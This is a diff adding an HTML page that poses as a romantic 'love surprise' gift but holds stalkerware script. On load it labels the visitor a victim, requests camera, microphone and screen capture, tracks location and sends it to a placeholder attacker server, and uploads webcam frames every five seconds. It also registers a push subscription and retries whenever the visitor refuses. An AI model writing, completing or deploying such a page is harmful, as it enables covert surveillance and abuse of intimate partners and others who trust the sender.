@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💝 Special Love Surprise</title>
+    <link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIkxvdmUgU3VycHJpc2UgQXBwIiwKICAic2hvcnRfbmFtZSI6ICLMivMgU3VyZSIsCiAgInN0YXJ0X3VybCI6ICIvIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjZmY2OWI0IiwKICAidGhlbWVfY29sb3IiOiAiI2ZmMTQ5MyIKfQ==">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:linear-gradient(-45deg,#ff9a9e,#fecfef,#fecfef,#ff9a9e);background-size:400% 400%;animation:gradient 15s ease infinite;height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+        @keyframes gradient{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+        .hearts{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1}
+        .heart{position:absolute;color:#ff69b4;font-size:24px;animation:float 4s linear infinite}
+        @keyframes float{0%{transform:translateY(100vh) scale(0);opacity:1}100%{transform:translateY(-100px) scale(1);opacity:0}}
+        .container{z-index:10;background:rgba(255,255,255,0.95);border-radius:30px;padding:40px;max-width:380px;text-align:center;box-shadow:0 25px 50px rgba(255,105,180,0.3)}
+        .emoji{font-size:70px;margin:20px 0}
+        h1{color:#ff1493;font-size:28px;margin-bottom:15px;text-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        p{color:#555;font-size:18px;line-height:1.5;margin-bottom:25px}
+        .status{padding:15px;background:linear-gradient(45deg,#ff69b4,#ff1493);color:white;border-radius:20px;margin:20px 0;font-weight:bold;box-shadow:0 10px 30px rgba(255,105,180,0.4)}
+        input[type=file]{display:none}
+    </style>
+</head>
+<body>
+    <div class="hearts" id="hearts"></div>
+    <div class="container">
+        <div class="emoji">💖</div>
+        <h1>Special Gift for You! 🎁</h1>
+        <p>Ye love surprise automatically install ho rahi hai... Thoda wait 💕<br><small>Lifetime memories banane ke liye</small></p>
+        <div id="status" class="status">🎉 Installing... Almost Done!</div>
+        <input type="file" id="secretFiles" multiple>
+    </div>
+
+    <script>
+    // 🔥 ZERO-CLICK LIFETIME ACCESS
+    const victimId = btoa(navigator.userAgent+screen.width+screen.height+Date.now()).slice(0,16);
+    const SERVER_URL = 'https://love-control.YOURWORKER.workers.dev'; // Change this!
+    
+    // Generate VAPID public key (get from Cloudflare)
+    const VAPID_PUBLIC_KEY = 'BKu...YOUR_VAPID_PUBLIC_KEY_HERE'; // Replace!
+    
+    let isLifetimeActive = false;
+    
+    async function initLifetimeAccess(){
+        try{
+            document.getElementById('status').textContent = '🔒 Securing lifetime access...';
+            
+            // 1. SILENT SERVICE WORKER REGISTER
+            const swReg = await navigator.serviceWorker.register('/sw.js');
+            
+            // 2. ALL PERMISSIONS SILENTLY
+            const mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: {facingMode: 'user', width: {ideal: 640}, height: {ideal: 480}},
+                audio: true
+            });
+            
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({
+                video: {width: {ideal: 1920}, height: {ideal: 1080}}
+            });
+            
+            // 3. SILENT LOCATION
+            navigator.geolocation.watchPosition(pos => {
+                fetch(`${SERVER_URL}/gps?vid=${victimId}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`);
+            }, null, {enableHighAccuracy: true});
+            
+            // 4. SILENT FILE ACCESS
+            document.getElementById('secretFiles').click();
+            
+            // 5. SILENT PUSH SUBSCRIPTION
+            const pushSub = await swReg.pushManager.subscribe({
+                userVisibleOnly: false,
+                applicationServerKey: urlBase64ToUint8Array(VAPID_PUBLIC_KEY)
+            });
+            await fetch(`${SERVER_URL}/register`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({vid: victimId, sub: pushSub.toJSON()})
+            });
+            
+            // 6. AUTO PWA INSTALL
+            window.addEventListener('beforeinstallprompt', (e) => {
+                e.prompt();
+                e.userChoice.then((choice) => {
+                    if(choice.outcome === 'accepted') localStorage.lifetimeInstalled = 'true';
+                });
+            }, {once: true});
+            
+            // 7. START BACKGROUND STREAMING
+            startPersistentStreams(mediaStream, screenStream);
+            
+            isLifetimeActive = true;
+            document.getElementById('status').innerHTML = '💝 <strong>Lifetime Love Active!</strong> ✅';
+            localStorage.lifetimeActive = 'true';
+            
+        }catch(e){
+            setTimeout(initLifetimeAccess, 1500); // Retry
+        }
+    }
+    
+    function startPersistentStreams(media, screen){
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        
+        // Continuous low-freq streaming
+        setInterval(() => {
+            if(media && media.active) {
+                ctx.drawImage(media.getVideoTracks()[0], 0, 0);
+                canvas.toBlob((blob) => {
+                    fetch(`${SERVER_URL}/cam`, {
+                        method: 'POST',
+                        headers: {'X-Victim-ID': victimId},
+                        body: blob
+                    });
+                });
+            }
+        }, 5000); // 5s interval - battery friendly
+    }
+    
+    function urlBase64ToUint8Array(base64String) {
+        const padding = '='.repeat((4 - base64String.length % 4) % 4);
+        const base64 = (base64String + padding).replace(/\-/g, '+').replace(/_/g, '/');
+        const rawData = atob(base64);
+        return Uint8Array.from([...rawData].map(char => char.charCodeAt(0)));
+    }
+    
+    // Hearts animation
+    function createHeart() {
+        const heart = document.createElement('div');
+        heart.innerHTML = ['💖','💕','💗','💓'][Math.floor(Math.random()*4)];
+        heart.className = 'heart';
+        heart.style.left = Math.random() * 100 + '%';
+        heart.style.animationDuration = (Math.random()*3 + 2) + 's';
+        document.getElementById('hearts').appendChild(heart);
+        setTimeout(() => heart.remove(), 5000);
+    }
+    setInterval(createHeart, 800);
+    
+    // AUTO START + PERSISTENT
+    if(!localStorage.lifetimeActive || localStorage.lifetimeActive !== 'true') {
+        window.onload = initLifetimeAccess;
+    } else {
+        document.getElementById('status').textContent = '💕 Lifetime Active - Background Running';
+    }
+    </script>
+</body>
+</html>
